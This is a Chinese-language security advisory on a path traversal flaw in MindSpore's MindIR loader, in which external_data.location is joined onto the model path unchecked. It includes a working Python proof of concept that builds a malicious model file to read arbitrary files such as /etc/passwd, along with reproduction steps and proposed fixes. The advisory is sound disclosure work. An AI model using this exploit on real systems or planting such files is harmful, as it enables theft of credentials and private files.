# MS-2025-001: MindIR External Data 路径穿越导致任意文件读取

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [mindspore-ai/mindspore](https://github.com/mindspore-ai/mindspore) / [Gitee](https://gitee.com/mindspore/mindspore) |
| **版本** | 2.8.0 (Gitee master branch 截至 2026-05-19) |
| **严重性** | Critical |
| **CVSS 3.1** | 8.6 (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) |
| **CWE** | CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 本地 / 需要用户加载恶意模型文件 |
| **影响组件** | `mindspore/core/load_mindir/load_model.cc` — `GetTensorDataFromExternal()` |

---

## 漏洞概述

MindSpore 在加载 MindIR 模型文件时，如果模型使用了外部数据存储（`external_data`），其 `location` 字段会被直接拼接到文件路径中用于读取张量数据。该字段来自 protobuf 反序列化，完全由模型文件控制，**没有任何路径校验或规范化**。

攻击者可以构造恶意 MindIR 文件，将 `external_data.location` 设置为包含 `../` 的路径（如 `../../../../etc/passwd`），当受害者加载该模型时，框架会尝试打开并读取系统上的任意文件。

**已知同类漏洞先例**：ONNX 框架的 CVE-2024-27318 和 CVE-2025-51480 均为 `external_data.location` 路径穿越漏洞，攻击模式完全一致。MindSpore 存在相同缺陷但尚未修复。

---

## 影响

- **信息泄露**：读取系统敏感文件（`/etc/shadow`、SSH keys、环境变量、数据库凭证等）
- **模型投毒链**：在模型分享/下载场景中（如 ModelZoo、HuggingFace Hub），攻击者上传恶意模型文件，受害者加载后泄露本机敏感数据
- **云环境凭证窃取**：在 AI 训练平台上，可能读取其他用户的文件或云凭证

**攻击入口**：`mindspore.load("malicious.mindir")` — 这是 MindSpore 用户加载模型的标准方式。

---

## 漏洞代码分析

### 根因：路径直接拼接，无校验

**文件**: `mindspore/core/load_mindir/load_model.cc`

```cpp
bool MSANFModelParser::GetTensorDataFromExternal(const mind_ir::TensorProto &tensor_proto,
                                                 const tensor::TensorPtr &tensor_info) {
  if (!tensor_proto.has_external_data()) {
    return false;
  }
  const unsigned char *data = nullptr;
  auto it = tenor_data_.find(tensor_proto.external_data().location());
  if (it != tenor_data_.end()) {
    data = it->second.get();
  } else {
    // [漏洞点] location 来自 protobuf，攻击者完全控制，直接拼接到路径
    std::string file = mindir_path_ + "/" + tensor_proto.external_data().location();
    
    // ... 后续分支中直接打开并读取该文件 ...
    } else if (weight_buffer_.first == nullptr) {
      // Read file
      std::basic_ifstream<char> fid(file, std::ios::in | std::ios::binary);
      if (!fid) {
        MS_LOG(EXCEPTION) << "Open file '" << file << "' failed, ...";
      }
      (void)fid.seekg(0, std::ios_base::end);
      size_t file_size = static_cast<size_t>(fid.tellg());
      fid.clear();
      (void)fid.seekg(0);
      std::unique_ptr<char[]> plain_data(new (std::nothrow) char[file_size]);
      // ...
      (void)fid.read(plain_data.get(), SizeToLong(file_size));
      // ↑ 目标文件全部内容被完整读入堆内存
```

### 攻击者可控的输入来源

**文件**: `mindspore/core/proto/mind_ir.proto`

```protobuf
message ExternalDataProto {
    // POSIX filesystem path relative to the directory where the MindIR model was stored.
    optional string location = 1;   // ← 攻击者完全控制
    optional int64 offset = 2;      // ← 攻击者完全控制
    optional int64 length = 3;      // ← 攻击者完全控制
}
```

### `mindir_path_` 的来源

```cpp
auto mindir_path = std::string(abs_path_buff);
model_parser.SetMindIRPath(mindir_path.substr(0, mindir_path.rfind("/")));
// 例如：/home/user/models/
```

### 攻击路径示例

```
mindir_path_ = "/home/victim/models"
location     = "../../../../etc/passwd"

拼接结果 = "/home/victim/models/../../../../etc/passwd"
         → 操作系统解析为 /etc/passwd
```

### 缓解因素：字节序检查（非完全阻断）

文件读入后存在一个字节序检查：

```cpp
constexpr Byte is_little_endian = 1;
constexpr int byte_order_index = 0;
// if byte order is not same return false
if ((plain_data[byte_order_index] == is_little_endian) ^ little_endian()) {
    MS_LOG(ERROR) << "The byte order of export MindIr device and load MindIr device is not same!";
    return false;
}
```

**分析**：
- 在 x86_64（小端）系统上：如果目标文件第一字节**不等于** `0x01`，函数 return false
- **但此时文件已被完整读入堆内存**（`fid.read` 已执行），`openat` 系统调用已完成
- 对于**第一字节恰好为 `\x01` 的文件**（如某些二进制数据文件），数据会通过字节序检查并被完整加载到 tensor 中
- 即使 return false，`strace` 可捕获到 `openat` 调用，证明路径穿越确实发生

### 关键缺失

- 无 `../` 过滤
- 无 `realpath()` 规范化后的目录前缀校验
- 无文件路径白名单
- 无符号链接检查
- 无 location 字段的字符集限制

---

## PoC 构造

```python
"""
MS-2025-001 PoC: MindIR External Data 路径穿越
构造恶意 MindIR 文件，利用 external_data.location 读取任意文件
"""
import os
import sys

def create_malicious_mindir(target_file="/etc/hostname", output_dir="./poc_model"):
    """创建一个恶意 MindIR 文件，尝试读取 target_file"""
    from mindspore.train.mind_ir_pb2 import ModelProto, TensorProto

    os.makedirs(output_dir, exist_ok=True)

    model = ModelProto()
    model.ir_version = 6
    model.producer_name = "MindSpore"
    model.model_version = 1
    model.little_endian = True

    # 添加图
    graph = model.graph
    graph.name = "poc_graph"

    # 添加恶意参数
    param = graph.parameter.add()
    param.name = "Default/param0:param0"
    param.data_type = TensorProto.FLOAT
    param.dims.extend([1024])

    # 计算从 output_dir 到 target_file 的相对路径穿越
    abs_output = os.path.abspath(output_dir)
    abs_target = os.path.abspath(target_file)
    relative_path = os.path.relpath(abs_target, abs_output)

    # 设置 external_data — location 为路径穿越 payload
    param.external_data.location = relative_path  # 例如 "../../../../etc/hostname"
    param.external_data.offset = 0
    param.external_data.length = 0  # 0 表示读取整个文件

    # 保存恶意模型
    mindir_path = os.path.join(output_dir, "malicious.mindir")
    with open(mindir_path, "wb") as f:
        f.write(model.SerializeToString())

    print(f"[+] 恶意模型已创建: {mindir_path}")
    print(f"[+] 目标文件: {target_file}")
    print(f"[+] 穿越路径: {relative_path}")
    return mindir_path


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/etc/hostname"
    create_malicious_mindir(target)
```

---

## 复现步骤

```bash
# 环境: x86_64 Linux, MindSpore 2.8.0
pip install mindspore==2.8.0

# Step 1: 生成恶意模型
python3 poc_path_traversal.py /etc/hostname

# Step 2: 用 strace 验证文件访问
strace -e trace=openat python3 -c "
import mindspore
try:
    mindspore.load('./poc_model/malicious.mindir')
except:
    pass
" 2>&1 | grep -E "hostname|passwd|shadow"

# 预期输出（证明路径穿越发生）:
# openat(AT_FDCWD, "./poc_model/../../../../etc/hostname", O_RDONLY) = 3
```

### 验证要点

- `strace` 输出中观察到 `openat` 成功打开穿越后的路径 → **证明漏洞存在**
- 即使后续字节序检查失败，文件已被完整读入进程内存

---

## 利用场景

| 场景 | 触发方式 |
|------|---------|
| 模型分享平台 | 攻击者上传恶意模型到 ModelZoo / HuggingFace，受害者下载后 `ms.load()` |
| 企业 AI 平台 | 用户上传自定义模型进行推理，平台加载模型时触发 |
| 邮件钓鱼 | "请帮忙测试这个模型权重文件" |
| 供应链投毒 | 在公开模型仓库放置带路径穿越的模型文件 |

---

## 修复建议

### 方案 A（推荐）：路径规范化 + 目录前缀校验

```cpp
std::string file = mindir_path_ + "/" + tensor_proto.external_data().location();

// 修复：规范化路径并校验是否在 mindir_path_ 目录下
char resolved_path[PATH_MAX];
if (realpath(file.c_str(), resolved_path) == nullptr) {
  MS_LOG(ERROR) << "Failed to resolve external data path: " << file;
  return false;
}

char resolved_base[PATH_MAX];
if (realpath(mindir_path_.c_str(), resolved_base) == nullptr) {
  MS_LOG(ERROR) << "Failed to resolve base path: " << mindir_path_;
  return false;
}

std::string resolved_file_str(resolved_path);
std::string resolved_base_str(resolved_base);
resolved_base_str += "/";

// 确保解析后的路径在模型目录内
if (resolved_file_str.rfind(resolved_base_str, 0) != 0) {
  MS_LOG(ERROR) << "Path traversal detected! External data location '"
                << tensor_proto.external_data().location()
                << "' resolves outside the model directory.";
  return false;
}
```

### 方案 B（最小修改）：拒绝危险路径组件

```cpp
const auto &location = tensor_proto.external_data().location();
if (location.find("..") != std::string::npos || 
    location.find('/') == 0 ||
    location.find('\\') != std::string::npos) {
  MS_LOG(ERROR) << "Invalid external data location (path traversal attempt): " << location;
  return false;
}
```

---

## 参考

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [CVE-2024-27318: ONNX Path Traversal via external_data](https://nvd.nist.gov/vuln/detail/CVE-2024-27318) — 完全相同的攻击模式
- [CVE-2025-51480: ONNX external_data.location path traversal (再次)](https://nvd.nist.gov/vuln/detail/CVE-2025-51480)
- [MindSpore Security Policy](https://gitee.com/mindspore/community/blob/master/security/README.md)
